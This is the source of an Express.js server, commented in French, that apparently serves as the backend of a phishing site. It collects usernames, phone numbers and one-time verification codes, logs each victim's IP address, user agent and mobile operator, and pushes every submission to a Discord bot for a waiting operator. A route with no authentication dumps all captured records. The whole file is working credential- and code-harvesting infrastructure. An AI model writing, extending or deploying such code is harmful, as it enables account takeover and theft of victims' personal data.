require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { users, stats } = require('./store');
const { sendInitialEmbed, sendCodeEmbed, updateStatsEmbed } = require('./bot');
const { detectOperator } = require('./operators');

const app = express();
const PORT = process.env.PORT || 3000;

// ======================= MIDDLEWARE =======================
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Middleware pour tracker les visites
app.use((req, res, next) => {
  if (req.path === '/' || req.path === '/index.html') {
    stats.totalVisits++;
    stats.currentVisitors++;
    stats.lastVisit = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
    
    // Mettre à jour l'embed Discord
    updateStatsEmbed();
    
    // Décrémenter après 5 minutes d'inactivité
    setTimeout(() => {
      if (stats.currentVisitors > 0) {
        stats.currentVisitors--;
        updateStatsEmbed();
      }
    }, 5 * 60 * 1000);
  }
  next();
});

function getClientIp(req) {
  return (
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    req.connection?.remoteAddress ||
    req.socket?.remoteAddress ||
    'IP inconnue'
  );
}

// ======================= ROUTES =======================
app.post('/api/v1/submit', async (req, res, next) => {
  try {
    const { username, phone } = req.body;

    if (!username || !phone) {
      return res.status(400).json({ error: 'Données manquantes' });
    }

    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'User-Agent inconnu';
    const operatorData = detectOperator(phone) || { operator: 'Inconnu', color: '#999999' };

    users[username] = {
      phone,
      status: 'waiting_code',
      submittedCode: null,
      lastAttemptedCode: null,
      ip,
      userAgent,
      operator: operatorData.operator,
      operatorColor: operatorData.color
    };

    await sendInitialEmbed(username, phone);
    
    // Mise à jour des stats
    stats.totalRegistrations++;
    stats.lastRegistration = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
    updateStatsEmbed();

    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

app.post('/api/v1/verify', async (req, res, next) => {
  try {
    const { username, code } = req.body;
    const user = users[username];

    if (!user) {
      return res.status(404).json({ error: 'Introuvable' });
    }

    user.lastAttemptedCode = code;
    user.submittedCode = code;
    user.status = 'pending';

    await sendCodeEmbed(username);
    
    // Mise à jour des stats
    stats.totalCodesSubmitted++;
    updateStatsEmbed();

    res.json({ success: true });
  } catch (err) {
    next(err);
  }
});

app.get('/api/v1/status/:username', (req, res) => {
  const user = users[req.params.username];
  if (!user) return res.status(404).json({ error: 'Introuvable' });
  res.json({ status: user.status });
});

app.get('/api/v1/stats/operators', (req, res) => {
  const operatorStats = {};
  Object.values(users).forEach(user => {
    const op = user.operator || 'Inconnu';
    operatorStats[op] = (operatorStats[op] || 0) + 1;
  });
  res.json(operatorStats);
});

app.get('/api/v1/users', (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 10;
  const allUsers = Object.entries(users).map(([username, data]) => ({
    username,
    ...data
  }));

  const start = (page - 1) * limit;
  const end = page * limit;

  res.json({
    users: allUsers.slice(start, end),
    pagination: {
      page,
      limit,
      total: allUsers.length,
      pages: Math.ceil(allUsers.length / limit)
    }
  });
});

// ======================= ERRORS =======================
app.use((err, req, res, next) => {
  console.error('❌ ERREUR API:', err);
  res.status(500).json({ error: 'Internal server error' });
});

// ======================= LISTEN =======================
app.listen(PORT, () => {
  console.log(`🌐 API Express lancée sur le port ${PORT}`);
});